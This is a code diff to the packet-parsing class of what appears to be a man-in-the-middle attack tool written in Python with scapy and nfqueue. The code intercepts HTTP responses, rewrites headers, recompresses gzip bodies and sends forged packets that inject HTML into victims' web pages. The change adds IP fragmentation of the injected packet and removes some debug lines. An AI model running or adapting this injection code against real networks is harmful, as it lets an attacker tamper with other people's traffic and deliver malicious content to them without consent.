@@ -243,7 +243,7 @@ class Parser():
          return
 
       if sport == 80 and self.html_url and 'Content-Type: text/html' in headers:
-         # This can be done better, probably using filter()
+         # This can be done better, probably using filter(), no make them a dictionary and use del
          header_lines = [x for x in header_lines if 'transfer-encoding' not in x.lower()]
          for h in header_lines:
             if '1.1 302' in h or '1.1 301' in h: # Allow redirects to go thru unperturbed
@@ -292,9 +292,6 @@ class Parser():
          # Recompress data if necessary
          if 'Content-Encoding: gzip' in headers:
             if body != '':
-#              debugger = open('injectedBody', 'w') #########################################
-#              debugger.write(body) #########################################
-#              debugger.close() #########################################
                try:
                   comp_body = StringIO()
                   f = gzip.GzipFile(fileobj=comp_body, mode='w', compresslevel = 9)
@@ -323,8 +320,9 @@ class Parser():
          del pkt[TCP].chksum
          try:
             payload.set_verdict(nfqueue.NF_DROP)
-            send(pkt)
-#           payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
+            pkt_frags = fragment(pkt)
+            for p in pkt_frags:
+                send(p)
             print R+'[!] Injected HTML into packet for '+W+self.html_url
             logger.write('[!] Injected HTML into packet for '+self.html_url)
             self.block_acks.append(ack)
